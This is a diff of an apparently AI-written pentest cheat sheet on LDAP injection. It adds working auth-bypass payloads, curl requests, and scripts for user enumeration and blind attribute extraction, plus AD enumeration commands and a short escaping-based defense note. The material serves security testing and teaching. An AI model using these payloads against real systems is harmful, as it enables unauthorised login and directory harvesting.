@@ -18,8 +18,8 @@ LDAP query injection via unsanitized input — enables auth bypass, attribute en
 | `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
 | `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
 | `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
-| `windapsearch` | LDAP-based AD enumeration — users, groups, computers, DAs — `pip3 install windapsearch` |
-| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt` |
+| `windapsearch` | LDAP-based AD enumeration — users, groups, computers, DAs — `git clone https://github.com/ropnop/windapsearch` (run `./windapsearch.py --dc-ip <ip> …`) |
+| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt` |
 
 ---
 
@@ -37,55 +37,71 @@ LDAP query injection via unsanitized input — enables auth bypass, attribute en
 # Special chars: ( ) * \ NUL
 ```
 
+> [!note] Two backend models — know which you're hitting:
+> - **Compare-in-filter** (shown above): the password is a clause in the search filter, so neutralizing it (`password=*`, empty `(&)`, or NUL truncation) bypasses auth directly.
+> - **Search-then-bind** (more common in real AD apps): the app first searches for the user, then does a separate LDAP **bind** with the supplied password. Here injection lives in the *search* filter, but a wildcard password won't bind — so you enumerate via **differential responses** ("invalid user" vs "invalid password"), not login success.
+>
+> Defense: escape filter metacharacters per RFC 4515 (`* → \2a`, `( → \28`, `) → \29`, `\ → \5c`, `NUL → \00`) / use parameterized filter builders.
+
 ---
 
 ## Authentication Bypass
 
 ```bash
 # Target: (&(uid=<USER>)(password=<PASS>))
+# KEY RULE: the injected filter must stay PAREN-BALANCED *and* neutralize the
+# (password=...) clause — otherwise it's still ANDed and login fails on a match.
 
-# Classic bypass — close the uid filter early, add OR true
-# Input username: admin)(&(|
-# Input password: anything
-# Result: (&(uid=admin)(&(|)(password=anything))
-# → uid=admin condition met → logged in as admin
+# Classic bypass — close uid, OR-in an always-true, swallow the password clause
+# Input username: *)(|(uid=*
+# Input password: *
+# Result: (&(uid=*)(|(uid=*)(password=*)))   ← balanced; OR(uid=*, password=*) = true
+# → matches first user (usually admin)
 
-# Wildcard username bypass — match any user
+# Wildcard username bypass — match any user (requires a set password attribute)
 # Input username: *
-# Result: (&(uid=*)(password=anything))
-# → matches all users → logs in as first user found
+# Input password: *
+# Result: (&(uid=*)(password=*))
+# → matches first user found
 
 # Inject into password field — make password condition always true
 # Input password: *)(&
-# Result: (&(uid=admin)(password=*)(&))
-# → password=* matches any value
+# Result: (&(uid=admin)(password=*)(&))   ← balanced; password=* + empty AND(true)
+# → password=* matches any set value
 
 # Bypass both fields
 # username: *)(|(&
 # password: pwd)
-# Result: (&(uid=*)(|(&)(password=pwd)))
-# → always true
+# Result: (&(uid=*)(|(&)(password=pwd)))   ← balanced; OR(true, password=pwd) = true
 
-# Common auth bypass payloads to try:
-# username field:
-#   admin)(&
-#   *
+# Null-byte truncation — chop the whole password clause off (backend must honor NUL)
+# Input username: admin)(uid=*))%00
+# Result: (&(uid=admin)(uid=*))   ← rest of the filter is truncated after the NUL
+
+# WARNING — these are UNBALANCED / still-ANDed and will NOT bypass:
+#   admin)(&(|      → (&(uid=admin)(&(|)(password=...))   5 opens / 4 closes → parse error
+#   )(|(|           → unbalanced → parse error
+#   admin)(&        → balanced but (password=...) stays ANDed → no bypass
+#   admin)(&(uid=admin → balanced but password stays ANDed → no bypass
+
+# Payloads that DO work (username field), password = *:
 #   *)(|(uid=*
-#   admin)(&(uid=admin
-#   )(|(|
-
-# password field:
 #   *
+#   admin)(uid=*))%00     (null-truncation)
+# Password field:
 #   *)(&
-#   anything
+#   *
 ```
 
-```python
-# Test via curl
-curl -s -X POST "http://<target>/login" -d "username=admin)(%26&password=anything" --data-urlencode "username=admin)(&" --data-urlencode "password=anything"
+```bash
+# Test via curl — let --data-urlencode encode the metacharacters for you
+curl -s -X POST "http://<target>/login" \
+  --data-urlencode "username=*)(|(uid=*" \
+  --data-urlencode "password=*"
 
 # application/json body
-curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" -d '{"username":"admin)(&","password":"anything"}'
+curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" \
+  -d '{"username":"*)(|(uid=*","password":"*"}'
 ```
 
 ---
@@ -94,16 +110,15 @@ curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" 
 
 ```bash
 # Wildcard-based enumeration — does username "a*" exist?
-# username: a*)(&
-# → (&(uid=a*)(...)
-# Success = valid prefix
+# username: a*   password: *   → (&(uid=a*)(password=*))
+# The password clause must be neutralized (wildcard here), or every request fails
+# regardless of match. Success/redirect = a user with that prefix exists.
 
-# Script to enumerate users
+# Script to enumerate users (login-success oracle)
 for prefix in a b c d e f admin user test root john; do
-  resp=$(curl -s -X POST "http://<target>/login" --data-urlencode "username=${prefix}*)(&" --data-urlencode "password=x")
-  if echo "$resp" | grep -qv "invalid\|error\|fail"; then
-    echo "[+] Prefix '$prefix' matches a valid user"
-  fi
+  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://<target>/login" \
+    --data-urlencode "username=${prefix}*" --data-urlencode "password=*")
+  [ "$resp" = "302" ] && echo "[+] Prefix '$prefix' matches a valid user"
 done
 
 # Brute force character by character
@@ -117,10 +132,11 @@ chars = string.ascii_lowercase + string.digits + "_-."
 while True:
     for c in chars:
         test = found + c
+        # uid=<test>* AND password=* (wildcard neutralizes the password check)
         r = requests.post(url, data={
-            "username": f"{test}*)(&",
-            "password": "x"
-        })
+            "username": f"{test}*",
+            "password": "*"
+        }, allow_redirects=False)
         if "Welcome" in r.text or r.status_code == 302:
             found += c
             print(f"[+] Found: {found}")
@@ -129,6 +145,10 @@ while True:
         print(f"[*] Username: {found}")
         break
 EOF
+
+# No password wildcard? Use a DIFFERENTIAL-RESPONSE oracle instead: many apps
+# return "invalid password" (user exists) vs "invalid user" (no match) — compare
+# response body/length for username=<test>* with a deliberately wrong password.
 ```
 
 ---
@@ -139,8 +159,9 @@ Extract LDAP attribute values character by character using wildcard matching.
 
 ```bash
 # Does the user with uid=admin have mail starting with 'a'?
-# Filter: (&(uid=admin)(mail=a*))
-# If login succeeds → yes
+# username: admin)(mail=a*   password: *
+# Filter: (&(uid=admin)(mail=a*)(password=*))  ← balanced, password neutralized
+# If login succeeds → the char matches
 
 # Enumerate email of admin
 python3 << 'EOF'
@@ -154,12 +175,13 @@ attr = "mail"   # change to cn, sn, givenName, memberOf, etc.
 while True:
     for c in chars:
         test = found + c
-        # Inject via second filter: uid=admin)(attr=<test>*)(uid=admin
-        payload = f"admin)({attr}={test}*)(uid=admin"
+        # Add the attr filter, then wildcard the password so it can't block a match:
+        # (&(uid=admin)(<attr>=<test>*)(password=*))
+        payload = f"admin)({attr}={test}*"
         r = requests.post(url, data={
             "username": payload,
-            "password": "x"
-        })
+            "password": "*"
+        }, allow_redirects=False)
         if "Welcome" in r.text or r.status_code == 302:
             found += c
             print(f"[+] {attr}: {found}")
@@ -212,7 +234,7 @@ curl -s -H "Referer: admin)(&" "http://<target>/app"
 
 # Burp: add header to every request via Match & Replace or Session Handling Rule
 # Fuzz header values with SecLists LDAP list
-ffuf -u "http://<target>/app" -H "X-User: FUZZ" -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt -mc 200,302
+ffuf -u "http://<target>/app" -H "X-User: FUZZ" -w /usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt -mc 200,302
 ```
 
 ---
@@ -230,8 +252,9 @@ When app has search functionality backed by LDAP:
 curl -s "http://<target>/search?q=*" | grep -oP "uid=[^,]+"
 
 # Close filter and add OR to dump all objects
-# Input: *)(|(objectClass=*
-# Result: (&(cn=**)(|(objectClass=*)(cn=))
+# Target: (&(cn=*<input>*)(objectClass=user))
+# Input:  *)(|(objectClass=*
+# Result: (&(cn=**)(|(objectClass=*)*)(objectClass=user))  → OR(objectClass=*) = everything
 curl -s --data-urlencode "search=*)(|(objectClass=*" "http://<target>/search"
 
 # Dump all users
@@ -265,30 +288,29 @@ ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>
 
 ---
 
-### windapsearch
+## windapsearch
 
 ```bash
-# Install
-pip3 install windapsearch
-# or: git clone https://github.com/ropnop/windapsearch
+# Install (GitHub script — not a reliable PyPI package)
+git clone https://github.com/ropnop/windapsearch && cd windapsearch
 
 # Enumerate domain users
-windapsearch -d <domain> -u <user>@<domain> -p <pass> --users
+./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --users
 
 # Domain admins
-windapsearch -d <domain> -u <user>@<domain> -p <pass> --da
+./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --da
 
 # All groups + members
-windapsearch -d <domain> -u <user>@<domain> -p <pass> --groups
+./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --groups
 
 # Computers
-windapsearch -d <domain> -u <user>@<domain> -p <pass> --computers
+./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --computers
 
 # Custom filter — all users with SPN set (Kerberoastable)
-windapsearch -d <domain> -u <user>@<domain> -p <pass> --custom "(&(objectClass=user)(servicePrincipalName=*))"
+./windapsearch.py --dc-ip <dc-ip> -d <domain> -u <user>@<domain> -p <pass> --custom "(&(objectClass=user)(servicePrincipalName=*))"
 ```
 
-### Operational Attributes — Attack Planning Data
+## Operational Attributes — Attack Planning Data
 
 ```bash
 # Get lockout / password status for a specific account
@@ -337,11 +359,11 @@ a*)(&               # users starting with 'a'
 *admin*)(&          # users containing 'admin'
 
 # LDAP injection fuzz list
-/usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt
+/usr/share/seclists/Fuzzing/LDAP.Fuzzing.txt
 ```
 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
